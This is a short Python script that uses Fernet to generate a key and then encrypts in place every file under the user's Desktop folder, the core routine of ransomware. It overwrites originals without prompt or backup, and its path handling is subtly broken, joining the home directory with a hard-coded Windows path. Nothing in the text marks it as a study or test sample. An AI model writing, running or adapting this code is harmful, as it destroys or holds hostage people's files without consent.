from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted)

def encrypt_all_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, key)

if __name__ == "__main__":
    # Generate key and save it
    key = generate_key()

    # Specify the desktop directory
    desktop_directory = os.path.join(os.path.expanduser("~"), "C:\\Users\\User\\Desktop")

    # Encrypt all files on the desktop
    encrypt_all_files(desktop_directory, key)
